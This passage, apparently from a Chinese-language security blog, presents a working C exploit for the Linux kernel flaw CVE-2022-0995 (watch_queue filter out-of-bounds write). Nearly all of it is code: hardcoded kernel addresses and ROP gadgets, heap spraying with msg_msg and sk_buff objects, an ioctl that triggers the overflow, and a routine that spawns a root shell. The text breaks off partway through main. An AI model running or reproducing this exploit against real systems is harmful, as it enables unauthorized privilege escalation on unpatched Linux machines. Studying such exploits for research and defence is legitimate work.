EXPLOIT</h3><p>最终的 exp 如下（基本上就是把 CVE-2021-22555 的 exp 里 trigger oob 的函数改一下就能打通了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/watch_queue.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> *<span class="hljs-title">wfilter</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfilters;<br>    <br>    nfilters = <span class="hljs-number">4</span>;<br>    wfilter = (<span class="hljs-keyword">struct</span> watch_notification_filter*)<br>            <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_filter)<br>                + nfilters * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_type_filter));<br>    wfilter-&gt;nr_filters = nfilters;<br><br>    <span class="hljs-comment">// normal filter</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (nfilters - <span class="hljs-number">1</span>); i++)<br>        wfilter-&gt;filters[i].type = <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">// evil filter</span><br>    <span class="hljs-comment">// 0x300 = 64 * 12, 12 * 8 = 96bytes</span><br>    <span class="hljs-comment">// 1 &lt;&lt; 0xa = 1024, maybe we can hit a proper bit</span><br>    wfilter-&gt;filters[nfilters - <span class="hljs-number">1</span>].type = <span class="hljs-number">0x30a</span>;<br><br>    <span class="hljs-comment">// triger oob write</span><br>    <span class="hljs-keyword">if</span> (ioctl(pipe_fd[<span class="hljs-number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);<br>    <br>    <span class="hljs-comment">// prevent memory leak in userspace(no need in fact)</span><br>    <span class="hljs-built_in">free</span>(wfilter);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// pipe to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span 